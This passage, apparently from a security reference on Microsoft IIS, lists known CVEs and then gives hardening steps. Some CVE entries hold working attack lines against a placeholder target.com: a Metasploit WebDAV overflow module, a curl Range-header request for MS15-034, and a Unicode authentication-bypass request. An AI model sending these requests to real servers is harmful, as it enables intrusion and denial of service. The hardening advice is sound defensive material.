<div class="language-bash highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="c1"># Specially crafted HTTP trailer headers can trigger RCE</span>
</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="c1"># Wormable - can spread without user interaction</span>
</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a><span class="c1"># Active exploitation in the wild</span>
</span></code></pre></div></p>
</details>
<details class="danger">
<summary>CVE-2020-0645 - IIS Server Tampering Vulnerability</summary>
<p>Tampering vulnerability in IIS when handling malformed request headers.</p>
<p><strong>Affected versions:</strong> IIS on Windows Server 2012-2019, Windows 10<br />
<strong>Severity:</strong> Medium<br />
<strong>Fixed in:</strong> February 2020 security update<br />
<strong>Impact:</strong> Request smuggling, cache poisoning</p>
</details>
<details class="danger">
<summary>CVE-2019-18935 - Telerik UI RCE via .NET Deserialization</summary>
<p>.NET deserialization vulnerability in Progress Telerik UI for ASP.NET AJAX.</p>
<p><strong>Affected versions:</strong> Telerik UI builds before R1 2020 (2020.1.114)<br />
<strong>Severity:</strong> Critical (CVSS 9.8)<br />
<strong>Impact:</strong> Remote code execution on IIS servers hosting Telerik</p>
<p><strong>Exploitation:</strong>
- Requires knowledge of Telerik encryption keys
- Often combined with CVE-2017-11357 or CVE-2017-11317 for key theft
- Upload malicious DLL files to C:\Windows\Temp\
- File naming: [UnixEpochTime].[Fraction].dll
- Actively exploited by APT groups against US government IIS servers</p>
<p><strong>Indicators:</strong>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="c1"># Check for malicious DLLs in Temp</span>
</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>dir<span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\*</span>.dll
</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a><span class="c1"># Look for files with Unix timestamp naming pattern</span>
</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a><span class="c1"># Example: 1667206973.2270932.dll</span>
</span></code></pre></div></p>
</details>
<details class="danger">
<summary>CVE-2017-7269 - IIS 6.0 WebDAV Buffer Overflow</summary>
<p>Buffer overflow in WebDAV service allowing remote code execution.</p>
<p><strong>Affected versions:</strong> IIS 6.0 on Windows Server 2003 R2<br />
<strong>Severity:</strong> Critical (CVSS 9.8)<br />
<strong>Impact:</strong> Remote code execution</p>
<p><strong>Exploitation:</strong>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="c1"># Metasploit module</span>
</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>use<span class="w"> </span>exploit/windows/iis/iis_webdav_scstoragepathfromurl
</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a><span class="nb">set</span><span class="w"> </span>RHOST<span class="w"> </span>target.com
</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a><span class="nb">set</span><span class="w"> </span>RPORT<span class="w"> </span><span class="m">80</span>
</span><span id="__span-27-5"><a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a>exploit
</span><span id="__span-27-6"><a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a>
</span><span id="__span-27-7"><a id="__codelineno-27-7" name="__codelineno-27-7" href="#__codelineno-27-7"></a><span class="c1"># Exploits ScStoragePathFromUrl function</span>
</span><span id="__span-27-8"><a id="__codelineno-27-8" name="__codelineno-27-8" href="#__codelineno-27-8"></a><span class="c1"># Send PROPFIND request with long &quot;If:&quot; header</span>
</span><span id="__span-27-9"><a id="__codelineno-27-9" name="__codelineno-27-9" href="#__codelineno-27-9"></a><span class="c1"># Header starts with &quot;If: &lt;http://&quot;</span>
</span><span id="__span-27-10"><a id="__codelineno-27-10" name="__codelineno-27-10" href="#__codelineno-27-10"></a><span class="c1"># Widely exploited in the wild in 2016-2017</span>
</span></code></pre></div></p>
</details>
<details class="danger">
<summary>CVE-2015-1635 - HTTP.sys Remote Code Execution (MS15-034)</summary>
<p>Critical remote code execution vulnerability in HTTP.sys.</p>
<p><strong>Affected versions:</strong> Windows 7-10, Server 2008 R2-2012 R2<br />
<strong>Severity:</strong> Critical (CVSS 9.8)<br />
<strong>Fixed in:</strong> April 2015<br />
<strong>Impact:</strong> Remote code execution or denial of service</p>
<p><strong>Exploitation:</strong>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="c1"># Integer overflow in Range header processing</span>
</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>curl<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Range: bytes=0-18446744073709551615&quot;</span><span class="w"> </span>http://target.com/
</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>
</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a><span class="c1"># Can be used for DoS or RCE</span>
</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a><span class="c1"># Caused significant impact when disclosed</span>
</span></code></pre></div></p>
</details>
<details class="danger">
<summary>CVE-2010-2730 - IIS FTP Service Heap Buffer Overflow</summary>
<p>Heap buffer overflow in FTP service 7.0 and 7.5 for IIS.</p>
<p><strong>Affected versions:</strong> IIS 7.0, 7.5<br />
<strong>Severity:</strong> Critical<br />
<strong>Fixed in:</strong> September 2010 (MS10-065)<br />
<strong>Impact:</strong> Remote code execution, denial of service</p>
<p><strong>Exploitation:</strong>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="c1"># Crafted FTP command triggers heap overflow</span>
</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a><span class="c1"># Allows arbitrary code execution</span>
</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a><span class="c1"># Affects ftpsvc.dll TELNET_STREAM_CONTEXT::OnSendData</span>
</span></code></pre></div></p>
</details>
<details class="danger">
<summary>CVE-2010-2731 - IIS FastCGI Request Header Buffer Overflow</summary>
<p>Buffer overflow when FastCGI is enabled.</p>
<p><strong>Affected versions:</strong> IIS 7.5<br />
<strong>Severity:</strong> Critical<br />
<strong>Fixed in:</strong> September 2010<br />
<strong>Impact:</strong> Remote code execution via crafted headers</p>
</details>
<details class="danger">
<summary>CVE-2009-1535, CVE-2009-1122 - WebDAV Authentication Bypass</summary>
<p>WebDAV authentication bypass via Unicode character encoding.</p>
<p><strong>Affected versions:</strong> IIS 5.0, 5.1, 6.0<br />
<strong>Severity:</strong> High<br />
<strong>Impact:</strong> Unauthorized access to protected resources</p>
<p><strong>Exploitation:</strong>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="c1"># Unicode bypass technique</span>
</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a><span class="c1"># Replace &quot;/&quot; with Unicode equivalent</span>
</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>GET<span class="w"> </span>/protected%c0%affile.txt<span class="w"> </span>HTTP/1.1
</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>
</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a><span class="c1"># Bypasses URI-based authentication</span>
</span></code></pre></div></p>
</details>
<hr />
<h2 id="hardening">Hardening<a class="headerlink" href="#hardening" title="Permanent link">&para;</a></h2>
<div class="admonition success">
<p class="admonition-title">Best practices</p>
<p><strong>1. Remove unnecessary features and modules:</strong>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="c"># Uninstall unused IIS features</span>
</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a><span class="nb">Remove-WindowsFeature</span> <span class="n">-Name</span> <span class="n">Web-WebDAV</span>
</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a><span class="nb">Remove-WindowsFeature</span> <span class="n">-Name</span> <span class="n">Web-Ftp-Server</span>
</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a>
</span><span id="__span-31-5"><a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a><span class="c"># Remove default IIS sample files</span>
</span><span id="__span-31-6"><a id="__codelineno-31-6" name="__codelineno-31-6" href="#__codelineno-31-6"></a><span class="nb">Remove-Item</span> <span class="n">C</span><span class="p">:\</span><span class="n">inetpub</span><span class="p">\</span><span class="n">wwwroot</span><span class="p">\</span><span class="n">iisstart</span><span class="p">.</span><span class="n">htm</span>
</span><span id="__span-31-7"><a id="__codelineno-31-7" name="__codelineno-31-7" href="#__codelineno-31-7"></a><span class="nb">Remove-Item</span> <span class="n">C</span><span class="p">:\</span><span class="n">inetpub</span><span class="p">\</span><span class="n">wwwroot</span><span class="p">\</span><span class="n">iisstart</span><span class="p">.</span><span class="n">png</span>
</span><span id="__span-31-8"><a id="__codelineno-31-8" name="__codelineno-31-8" href="#__codelineno-31-8"></a>
</span><span id="__span-31-9"><a id="__codelineno-31-9" name="__codelineno-31-9" href="#__codelineno-31-9"></a><span class="c"># Disable unnecessary HTTP modules</span>
</span><span id="__span-31-10"><a id="__codelineno-31-10" name="__codelineno-31-10" href="#__codelineno-31-10"></a><span class="k">%</span><span class="n">systemroot</span><span class="p">%\</span><span class="n">system32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">\</span><span class="n">appcmd</span><span class="p">.</span><span class="n">exe</span> <span class="nb">set </span><span class="n">config</span> <span class="p">/</span><span class="n">section</span><span class="p">:</span><span class="n">modules</span> <span class="p">/-[</span><span class="n">name</span><span class="p">=</span><span class="s1">&#39;WebDAVModule&#39;</span><span class="p">]</span>
</span></code></pre></div></p>
<p><strong>2. Hide server version and headers:</strong>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="c"># Remove Server header (IIS 10+)</span>
</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="nb">Set-WebConfigurationProperty</span> <span class="n">-PSPath</span> <span class="s1">&#39;MACHINE/WEBROOT/APPHOST&#39;</span> <span class="n">-Filter</span> <span class="s2">&quot;system.webServer/security/requestFiltering&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;removeServerHeader&quot;</span> <span class="n">-Value</span> <span class="s2">&quot;True&quot;</span>
</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>
</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a><span class="c"># Alternative via registry (all versions)</span>
</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a><span class="n">reg</span> <span class="n">add</span> <span class="s2">&quot;HKLM\SYSTEM\CurrentControlSet\Services\HTTP\Parameters&quot;</span> <span class="p">/</span><span class="n">v</span> <span class="n">DisableServerHeader</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="p">/</span><span class="n">d</span> <span class="n">1</span> <span class="p">/</span><span class="n">f</span>
</span><span id="__span-32-6"><a id="__codelineno-32-6" name="__codelineno-32-6" href="#__codelineno-32-6"></a>
</span><span id="__span-32-7"><a id="__codelineno-32-7" name="__codelineno-32-7" href="#__codelineno-32-7"></a><span class="c"># Remove X-Powered-By header in applicationHost.config</span>
</span><span id="__span-32-8"><a id="__codelineno-32-8" name="__codelineno-32-8" href="#__codelineno-32-8"></a><span class="c"># &lt;httpProtocol&gt;</span>
</span><span id="__span-32-9"><a id="__codelineno-32-9" name="__codelineno-32-9" href="#__codelineno-32-9"></a><span class="c">#   &lt;customHeaders&gt;</span>
</span><span id="__span-32-10"><a id="__codelineno-32-10" name="__codelineno-32-10" href="#__codelineno-32-10"></a><span class="c">#     &lt;remove name=&quot;X-Powered-By&quot; /&gt;</span>
</span><span id="__span-32-11"><a id="__codelineno-32-11" name="__codelineno-32-11" href="#__codelineno-32-11"></a><span class="c">#   &lt;/customHeaders&gt;</span>
</span><span id="__span-32-12"><a id="__codelineno-32-12" name="__codelineno-32-12" href="#__codelineno-32-12"></a><span class="c"># &lt;/httpProtocol&gt;</span>
</span><span id="__span-32-13"><a id="__codelineno-32-13" name="__codelineno-32-13" href="#__codelineno-32-13"></a>
</span><span id="__span-32-14"><a id="__codelineno-32-14" name="__codelineno-32-14" href="#__codelineno-32-14"></a><span class="c"># Or via command line</span>
</span><span id="__span-32-15"><a id="__codelineno-32-15" name="__codelineno-32-15" href="#__codelineno-32-15"></a><span class="k">%</span><span class="n">systemroot</span><span class="p">%\</span><span class="n">system32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">\</span><span class="n">appcmd</span><span class="p">.</span><span class="n">exe</span> <span class="nb">set </span><span class="n">config</span> <span class="p">/</span><span class="n">section</span><span class="p">:</span><span class="n">httpProtocol</span> <span class="p">/</span><span class="n">-customHeaders</span><span class="p">.[</span><span class="n">name</span><span class="p">=</span><span class="s1">&#39;X-Powered-By&#39;</span><span class="p">]</span>
</span><span id="__span-32-16"><a id="__codelineno-32-16" name="__codelineno-32-16" href="#__codelineno-32-16"></a>
</span><span id="__span-32-17"><a id="__codelineno-32-17" name="__codelineno-32-17" href="#__codelineno-32-17"></a><span class="c"># Remove X-AspNet-Version in web.config</span>
</span><span id="__span-32-18"><a id="__codelineno-32-18" name="__codelineno-32-18" href="#__codelineno-32-18"></a><span class="c"># &lt;system.web&gt;</span>
</span><span id="__span-32-19"><a id="__codelineno-32-19" name="__codelineno-32-19" href="#__codelineno-32-19"></a><span class="c">#   &lt;httpRuntime enableVersionHeader=&quot;false&quot; /&gt;</span>
</span><span id="__span-32-20"><a id="__codelineno-32-20" name="__codelineno-32-20" href="#__codelineno-32-20"></a><span class="c"># &lt;/system.web&gt;</span>
</span></code></pre></div></p>
<p><strong>3. Disable directory browsing:</strong>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="c"># Globally disable directory browsing</span>
</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a><span class="k">%</span><span class="n">systemroot</span><span class="p">%\</span><span class="n">system32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">\</span><span class="n">appcmd</span><span class="p">.</span><span class="n">exe</span> <span class="nb">set </span><span class="n">config</span> <span class="p">/</span><span class="n">section</span><span class="p">:</span><span class="n">directoryBrowse</span> <span class="p">/</span><span class="n">enabled</span><span class="p">:</span><span class="n">false</span>
</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>
</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a><span class="c"># Or in web.config</span>
</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a><span class="c"># &lt;system.webServer&gt;</span>
</span><span id="__span-33-6"><a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a><span class="c">#   &lt;directoryBrowse enabled=&quot;false&quot; /&gt;</span>
</span><span id="__span-33-7"><a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a><span class="c"># &lt;/system.webServer&gt;</span>
</span></code></pre></div></p>
<p><strong>4. Configure strong SSL/TLS:</strong>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="c"># Use IIS Crypto tool (recommended) or manual registry changes</span>
</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a><span class="c"># Download from: https://www.nartac.com/Products/IISCrypto</span>
</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a>
</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a><span class="c"># Disable weak protocols (SSL 2.0, SSL 3.0, TLS 1.0, TLS 1.1)</span>
</span><span id="__span-34-5"><a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a><span class="c"># Enable only TLS 1.2 and TLS 1.3</span>
</span><span id="__span-34-6"><a id="__codelineno-34-6" name="__codelineno-34-6" href="#__codelineno-34-6"></a>
</span><span id="__span-34-7"><a id="__codelineno-34-7" name="__codelineno-34-7" href="#__codelineno-34-7"></a><span class="c"># Disable weak ciphers</span>
</span><span id="__span-34-8"><a id="__codelineno-34-8" name="__codelineno-34-8" href="#__codelineno-34-8"></a><span class="c"># Enable only strong cipher suites:</span>
</span><span id="__span-34-9"><a id="__codelineno-34-9" name="__codelineno-34-9" href="#__codelineno-34-9"></a><span class="c"># - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384</span>
</span><span id="__span-34-10"><a id="__codelineno-34-10" name="__codelineno-34-10" href="#__codelineno-34-10"></a><span class="c"># - TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256</span>
</span><span id="__span-34-11"><a id="__codelineno-34-11" name="__codelineno-34-11" href="#__codelineno-34-11"></a><span class="c"># - TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384</span>
</span><span id="__span-34-12"><a id="__codelineno-34-12" name="__codelineno-34-12" href="#__codelineno-34-12"></a><span class="c"># - TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256</span>
</span><span id="__span-34-13"><a id="__codelineno-34-13" name="__codelineno-34-13" href="#__codelineno-34-13"></a>
</span><span id="__span-34-14"><a id="__codelineno-34-14" name="__codelineno-34-14" href="#__codelineno-34-14"></a><span class="c"># Enforce HSTS (in web.config or applicationHost.config)</span>
</span><span id="__span-34-15"><a id="__codelineno-34-15" name="__codelineno-34-15" href="#__codelineno-34-15"></a><span class="c"># &lt;httpProtocol&gt;</span>
</span><span id="__span-34-16"><a id="__codelineno-34-16" name="__codelineno-34-16" href="#__codelineno-34-16"></a><span class="c">#   &lt;customHeaders&gt;</span>
</span><span id="__span-34-17"><a id="__codelineno-34-17" name="__codelineno-34-17" href="#__codelineno-34-17"></a><span class="c">#     &lt;add name=&quot;Strict-Transport-Security&quot; value=&quot;max-age=31536000; includeSubDomains; preload&quot; /&gt;</span>
</span><span id="__span-34-18"><a id="__codelineno-34-18" name="__codelineno-34-18" href="#__codelineno-34-18"></a><span class="c">#   &lt;/customHeaders&gt;</span>
</span><span id="__span-34-19"><a id="__codelineno-34-19" name="__codelineno-34-19" href="#__codelineno-34-19"></a><span class="c"># &lt;/httpProtocol&gt;</span>
</span></code></pre></div></p>
<p><strong>5. Add security headers:</strong></p>
<p>Add to web.config or applicationHost.config:
<div class="language-xml highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="nt">&lt;httpProtocol&gt;</span>
</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a><span class="w">  </span><span class="nt">&lt;customHeaders&gt;</span>
</span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a><span class="w">    </span><span class="cm">&lt;!-- Remove default headers --&gt;</span>
</span><span id="__span-35-4"><a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a><span class="w">    </span><span class="nt">&lt;remove</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;X-Powered-By&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
</span><span id="__span-35-5"><a id="__codelineno-35-5" name="__codelineno-35-5" href="#__codelineno-35-5"></a>
</span><span id="__span-35-6"><a id="__codelineno-35-6" name="__codelineno-35-6" href="#__codelineno-35-6"></a><span class="w">    </span><span class="cm">&lt;!-- Add security headers --&gt;</span>
</span><span id="__span-35-7"><a id="__codelineno-35-7" name="__codelineno-35-7" href="#__codelineno-35-7"></a><span class="w">    </span><span class="nt">&lt;add</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;X-Content-Type-Options&quot;</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;nosniff&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
</span><span id="__span-35-8"><a id="__codelineno-35-8" name="__codelineno-35-8" href="#__codelineno-35-8"></a><span class="w">    </span><span class="nt">&lt;add</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;X-Frame-Options&quot;</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;SAMEORIGIN&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
</span><span id="__span-35-9"><a id="__codelineno-35-9" name="__codelineno-35-9" href="#__codelineno-35-9"></a><span class="w">    </span><span class="nt">&lt;add</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;X-XSS-Protection&quot;</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;1; mode=block&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
</span><span id="__span-35-10"><a id="__codelineno-35-10" name="__codelineno-35-10" href="#__codelineno-35-10"></a><span class="w">    </span><span class="nt">&lt;add</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;Referrer-Policy&quot;</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;strict-origin-when-cross-origin&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
</span><span id="__span-35-11"><a id="__codelineno-35-11" name="__codelineno-35-11" href="#__codelineno-35-11"></a><span class="w">    </span><span class="nt">&lt;add</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;Permissions-Policy&quot;</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;geolocation=(), microphone=(), camera=()&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
</span><span id="__span-35-12"><a id="__codelineno-35-12" name="__codelineno-35-12" href="#__codelineno-35-12"></a><span class="w">    </span><span class="nt">&lt;add</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;Content-Security-Policy&quot;</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;default-src &#39;self&#39;; script-src &#39;self&#39;; style-src &#39;self&#39; &#39;unsafe-inline&#39;;&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
</span><span id="__span-35-13"><a id="__codelineno-35-13" name="__codelineno-35-13" href="#__codelineno-35-13"></a><span class="w">    </span><span class="nt">&lt;add</span><span class="w"> </span><span class="na">name=</span><span class="s">&quot;Strict-Transport-Security&quot;</span><span class="w"> </span><span class="na">value=</span><span class="s">&quot;max-age=31536000; includeSubDomains; preload&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
</span><span id="__span-35-14"><a id="__codelineno-35-14" name="__codelineno-35-14" href="#__codelineno-35-14"></a><span class="w">  </span><span class="nt">&lt;/customHeaders&gt;</span>
</span><span id="__span-35-15"><a id="__codelineno-35-15" name="__codelineno-35-15" href="#__codelineno-35-15"></a><span class="nt">&lt;/httpProtocol&gt;</span>
</span></code></pre></div></p>
<p><strong>6. Disable insecure HTTP methods:</strong>
<div class="language-xml highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="cm">&lt;!-- In web.config --&gt;</span>
</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a><span class="nt">&lt;system.webServer&gt;</span>
</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a><span class="w">  </span><span class="nt">&lt;security&gt;</span>
</span><span id="__span-36-4"><a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a><span class="w">    </span><span class="nt">&lt;requestFiltering&gt;</span>
</span><span id="__span-36-5"><a id="__codelineno-36-5" name="__codelineno-36-5" href="#__codelineno-36-5"></a><span class="w">      </span><span class="nt">&lt;verbs</span><span class="w"> </span><span class="na">allowUnlisted=</span><span class="s">&quot;false&quot;</span><span class="nt">&gt;</span>
</span><span id="__span-36-6"><a id="__codelineno-36-6" name="__codelineno-36-6" href="#__codelineno-36-6"></a><span class="w">        </span><span class="nt">&lt;add</span><span class="w"> </span><span class="na">verb=</span><span class="s">&quot;GET&quot;</span><span class="w"> </span><span class="na">allowed=</span><span class="s">&quot;true&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
</span><span id="__span-36-7"><a id="__codelineno-36-7" name="__codelineno-36-7" href="#__codelineno-36-7"></a><span class="w">        </span><span class="nt">&lt;add</span><span class="w"> </span><span class="na">verb=</span><span class="s">&quot;POST&quot;</span><span class="w"> </span><span class="na">allowed=</span><span class="s">&quot;true&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
</span><span id="__span-36-8"><a id="__codelineno-36-8" name="__codelineno-36-8" href="#__codelineno-36-8"></a><span class="w">        </span><span class="nt">&lt;add</span><span class="w"> </span><span class="na">verb=</span><span class="s">&quot;HEAD&quot;</span><span class="w"> </span><span class="na">allowed=</span><span class="s">&quot;true&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
</span><span id="__span-36-9"><a id="__codelineno-36-9" name="__codelineno-36-9" href="#__codelineno-36-9"></a><span class="w">      </span><span class="nt">&lt;/verbs&gt;</span>
</span><span id="__span-36-10"><a id="__codelineno-36-10" name="__codelineno-36-10" href="#__codelineno-36-10"></a><span class="w">    </span><span class="nt">&lt;/requestFiltering&gt;</span>
</span><span id="__span-36-11"><a id="__codelineno-36-11" name="__codelineno-36-11" href="#__codelineno-36-11"></a><span class="w">  </span><span class="nt">&lt;/security&gt;</span>
</span><span id="__span-36-12"><a id="__codelineno-36-12" name="__codelineno-36-12" href="#__codelineno-36-12"></a><span class="nt">&lt;/system.webServer&gt;</span>
</span></code></pre></div></p>
<p><strong>7. Configure application pool isolation:</strong>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="c"># Each application should have its own pool</span>
</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a><span class="k">%</span><span class="n">systemroot</span><span class="p">%\</span><span class="n">system32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">\</span><span class="n">appcmd</span><span class="p">.</span><span class="n">exe</span> <span class="n">add</span> <span class="n">apppool</span> <span class="p">/</span><span class="n">name</span><span class="p">:</span><span class="s2">&quot;MyAppPool&quot;</span>
</span><span id="__span-37-3"><a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a>
</span><span id="__span-37-4"><a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a><span class="c"># Use least privilege identity</span>
</span><span id="__span-37-5"><a id="__codelineno-37-5" name="__codelineno-37-5" href="#__codelineno-37-5"></a><span class="k">%</span><span class="n">systemroot</span><span class="p">%\</span><span class="n">system32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">\</span><span class="n">appcmd</span><span class="p">.</span><span class="n">exe</span> <span class="nb">set </span><span class="n">apppool</span> <span class="s2">&quot;MyAppPool&quot;</span> <span class="p">/</span><span class="n">processModel</span><span class="p">.</span><span class="n">identityType</span><span class="p">:</span><span class="n">ApplicationPoolIdentity</span>
</span><span id="__span-37-6"><a id="__codelineno-37-6" name="__codelineno-37-6" href="#__codelineno-37-6"></a>
</span><span id="__span-37-7"><a id="__codelineno-37-7" name="__codelineno-37-7" href="#__codelineno-37-7"></a><span class="c"># Enable 32-bit applications only if needed</span>
</span><span id="__span-37-8"><a id="__codelineno-37-8" name="__codelineno-37-8" href="#__codelineno-37-8"></a><span class="k">%</span><span class="n">systemroot</span><span class="p">%\</span><span class="n">system32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">\</span><span class="n">appcmd</span><span class="p">.</span><span class="n">exe</span> <span class="nb">set </span><span class="n">apppool</span> <span class="s2">&quot;MyAppPool&quot;</span> <span class="p">/</span><span class="n">enable32BitAppOnWin64</span><span class="p">:</span><span class="n">false</span>
</span></code></pre></div></p>
<p><strong>8. Implement request filtering:</strong>
<div class="language-xml highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="nt">&lt;system.webServer&gt;</span>
</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a><span class="w">  </span><span class="nt">&lt;security&gt;</span>
